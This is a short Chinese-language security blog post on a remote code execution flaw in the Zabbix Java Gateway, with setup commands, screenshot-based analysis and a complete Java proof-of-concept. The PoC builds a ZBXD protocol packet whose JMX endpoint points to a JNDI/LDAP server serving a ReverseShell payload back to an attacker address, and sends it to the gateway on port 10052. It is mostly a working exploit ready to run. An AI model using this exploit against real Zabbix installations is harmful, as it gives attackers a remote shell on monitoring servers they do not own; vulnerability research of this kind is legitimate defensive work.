# Zabbix Java Gateway RCE

  
  
&lt;!--more--&gt;  
## 0x00 环境搭建  
```bash  
wget https://cdn.zabbix.com/zabbix/sources/stable/7.2/zabbix-7.2.1.tar.gz  
apt install build-essential  
./configure --enable-java --prefix=/root/test  
make  
make install  
  
cd /root/test/sbin/zabbix_java  
./startup.sh  
```  
`default port 10052`  
## 0x01 漏洞分析  
`com.zabbix.gateway.ZabbixJMXConnectorFactory#connect()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501051056304.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501051111642.png)
`javax.management.remote.rmi.RMIConnector#connect()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501051114329.png)
## 0x02 POC  
JNDI   
https://github.com/X1r0z/JNDIMap  
POC  
```java  
package org.example;    
    
import java.io.ByteArrayOutputStream;    
import java.io.InputStream;    
import java.io.OutputStream;    
import java.net.Socket;    
import java.nio.ByteBuffer;    
import java.nio.ByteOrder;    
import java.nio.charset.StandardCharsets;    
    
public class  ZabbixJndiEvil{    
    
    public static byte[] createPacket(String requestType, String jmxEndpoint) throws Exception {    
        // Step 1: Create JSON Data    
        String jsonData = String.format(    
                &#34;{\&#34;request\&#34;: \&#34;%s\&#34;, \&#34;jmx_endpoint\&#34;: \&#34;%s\&#34;, \&#34;keys\&#34;: [\&#34;key1\&#34;, \&#34;key2\&#34;]}&#34;,    
                requestType, jmxEndpoint    
        );    
        byte[] jsonBytes = jsonData.getBytes(StandardCharsets.UTF_8);    
    
        // Step 2: Create Packet with Protocol Header and Data Length    
        ByteArrayOutputStream packetStream = new ByteArrayOutputStream();    
// Protocol Header (Assuming ZBXD\1)    
        packetStream.write(&#34;ZBXD\1&#34;.getBytes(StandardCharsets.UTF_8));    
    
        // Data length in little-endian format    
        ByteBuffer lengthBuffer = ByteBuffer.allocate(8);    
        lengthBuffer.order(ByteOrder.LITTLE_ENDIAN);    
        lengthBuffer.putLong(jsonBytes.length);    
        packetStream.write(lengthBuffer.array());    
    
        // JSON data    
        packetStream.write(jsonBytes);    
    
        return packetStream.toByteArray();    
    }    
    public static void sendPacket(String host, int port, byte[] packet) throws Exception {    
        // Step 3: Create a socket and connect to Zabbix Java Gateway    
        try (Socket socket = new Socket(host, port);    
             OutputStream outputStream = socket.getOutputStream();    
             InputStream inputStream = socket.getInputStream()) {    
    
            // Send the packet    
            outputStream.write(packet);    
            outputStream.flush();    
            System.out.println(&#34;Packet sent successfully!&#34;);    
    
            // Step 4: Read the response    
            ByteArrayOutputStream responseBuffer = new ByteArrayOutputStream();    
            byte[] buffer = new byte[4096];    
            int bytesRead;    
    
            while ((bytesRead = inputStream.read(buffer)) != -1) {    
                responseBuffer.write(buffer, 0, bytesRead);    
                if (inputStream.available() == 0) {    
                    break;    
                }    
            }    
    
            String response = responseBuffer.toString(String.valueOf(StandardCharsets.UTF_8));    
            System.out.println(&#34;Received response: &#34; &#43; response);    
    
        }    
    }    
    public static void main(String[] args) {    
        try {    
            // Configuration for the packet    
            String requestType = &#34;java gateway jmx&#34;;    
            String jmxEndpoint = &#34;service:jmx:rmi:///jndi/ldap://10.216.7.79:1389/Basic/ReverseShell/10.216.7.79/2333&#34;;    
    
            // Create the packet    
            byte[] packet = createPacket(requestType, jmxEndpoint);    
    
            // Send the packet to Zabbix Java Gateway at localhost:10052    
            sendPacket(&#34;10.211.55.29&#34;, 10052, packet);    
        } catch (Exception e) {    
            e.printStackTrace();    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501050054992.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501050054335.png)
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/zabbix-java-gateway-rce/  

